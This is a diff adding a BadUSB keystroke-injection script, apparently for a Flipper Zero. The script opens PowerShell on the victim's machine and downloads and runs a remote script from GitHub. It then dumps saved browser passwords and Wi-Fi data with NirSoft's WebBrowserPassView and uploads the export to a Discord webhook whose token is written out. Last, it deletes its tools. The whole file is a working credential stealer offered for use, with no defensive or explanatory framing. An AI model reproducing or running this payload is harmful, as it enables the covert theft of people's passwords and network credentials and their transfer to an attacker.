@@ -1,0 +1,38 @@
+DELAY 2000
+GUI r
+DELAY 1000
+ALTSTRING powershell
+ENTER
+DELAY 1000
+REM edit your webhook here
+ALTSTRING $DiscordUrl = 'https://discord.com/api/webhooks/1194675026331447408/tVze9Ls7YQRQ5ZANKTIyvug9rfS1lG7wdXy9pZA_rUZ5KUDEms_E9SxgW8sZjMjkarl9'
+ENTER
+ALTSTRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
+ENTER
+DELAY 500
+ALTSTRING version-av
+ENTER
+ALTSTRING Wifi
+ENTER
+ALTSTRING Get-Nirsoft
+ENTER
+DELAY 5000
+ALTSTRING wbpv28821@
+ENTER
+ALTSTRING .\WebBrowserPassView.exe
+ENTER
+DELAY 3000
+CTRL A
+CTRL S
+DELAY 1000
+ALTSTRING c:\temp\export.txt
+ENTER
+DELAY 1000
+ALT F4
+DELAY 800
+ALTSTRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
+ENTER
+ALTSTRING Del-Nirsoft-File
+ENTER
+ALTSTRING EXIT
+ENTER
